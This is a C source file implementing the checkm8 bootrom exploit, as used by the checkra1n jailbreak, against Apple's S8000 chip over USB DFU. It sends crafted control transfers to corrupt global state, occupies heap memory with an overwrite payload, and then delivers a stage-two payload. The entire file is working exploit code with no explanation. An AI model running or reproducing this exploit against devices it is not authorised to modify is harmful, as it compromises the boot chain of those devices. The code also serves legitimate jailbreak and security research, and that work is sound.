#include <iousb.h>
#include <checkra1n_common.h>

static unsigned char blank[2048]; // 00000000...
static unsigned char AAAA[2048];  // 41414141...

// log
static int empty(void){
    return 0;
}

#ifdef HAVE_DEBUG
#define DEBUG_(...) printf(__VA_ARGS__)
#else
#define DEBUG_(...) empty()
#endif


static void set_global_state(io_client_t client){
    IOReturn r;
    unsigned int val;
    unsigned int sent;
    
    val = 704; // s8000
    
    int i=0;
    while((sent = async_usb_ctrl_transfer_with_cancel(client, 0x21, 1, 0x0000, 0x0000, AAAA, 2048, 0)) != 0x40){
        i++;
        DEBUG_("%x\n", i);
        usleep(10000);
        r = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, AAAA, 64);
        usleep(10000);
    }
    
    r = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, AAAA, val, 100);
    
    r = usb_ctrl_transfer_with_time(client, 0x21, 4, 0x0000, 0x0000, NULL, 0, 0);
    
}

static void heap_occupation(io_client_t client, uint16_t cpid, checkra1n_payload_t payload){
    IOReturn r;
    
    // over1 = dummy
    r = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, payload.over2, payload.over2_len, 100);
    
    r = usb_ctrl_transfer_with_time(client, 0x21, 4, 0x0000, 0x0000, NULL, 0, 0);
    
}

int checkra1n_s8000(io_client_t client, uint16_t cpid, checkra1n_payload_t payload){
    int r;
    
    bzero(blank, 2048);
    memset(AAAA, 'A', 2048);
    
    LOG_EXPLOIT_NAME("checkm8");
    
    usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, blank, 2048);
    usleep(1000);
    
    LOG_DEBUG("reconnect");
    io_reset(client);
    io_close(client);
    client = NULL;
    usleep(10000);
    get_device_time(&client, 5);
    if(!client) {
        LOG_ERROR("ERROR: Failed to reconnect to device");
        return -1;
    }
    
    LOG_DEBUG("[checkra1n] running set_global_state()");
    set_global_state(client);
    
    LOG_DEBUG("reconnect");
    io_close(client);
    client = NULL;
    usleep(10000);
    get_device_time(&client, 5);
    if(!client) {
        LOG_ERROR("ERROR: Failed to reconnect to device");
        return -1;
    }
    
    LOG_DEBUG("[checkra1n] running heap_occupation()");
    heap_occupation(client, cpid, payload);
    
    LOG_DEBUG("reconnect");
    io_close(client);
    client = NULL;
    usleep(10000);
    get_device_time(&client, 5);
    if(!client) {
        LOG_ERROR("ERROR: Failed to reconnect to device");
        return -1;
    }
    
    LOG_DEBUG("[checkra1n] sending stage2 payload");
    payload_stage2(client, cpid, payload);
    
    connect_to_stage2(client, cpid, payload);
    
    return 0;
}
